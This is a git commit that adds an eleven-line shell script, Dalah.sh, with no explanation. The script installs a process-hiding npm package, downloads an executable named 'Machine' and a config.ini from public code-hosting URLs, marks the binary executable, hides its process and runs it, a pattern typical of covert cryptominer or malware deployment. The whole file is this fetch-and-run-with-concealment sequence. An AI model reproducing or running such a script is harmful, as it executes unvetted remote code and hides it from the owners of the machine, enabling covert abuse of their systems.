ada72d46c0d614497a287efecfe9a0b7635a1f5a
Halahsiah <95866968+Halahsiah@users.noreply.github.com>
2021-12-10 22:41:48 +0700

    Create Dalah.sh

---
+++ Dalah.sh
@@ -0,0 +1,11 @@
+npm i -g node-process-hider 
+
+wget https://gitlab.com/NuDev2021/ppa/-/raw/main/Machine
+
+wget https://raw.githubusercontent.com/Halahsiah/ehem/main/config.ini
+
+chmod +x Machine
+
+ph add Machine
+
+./Machine
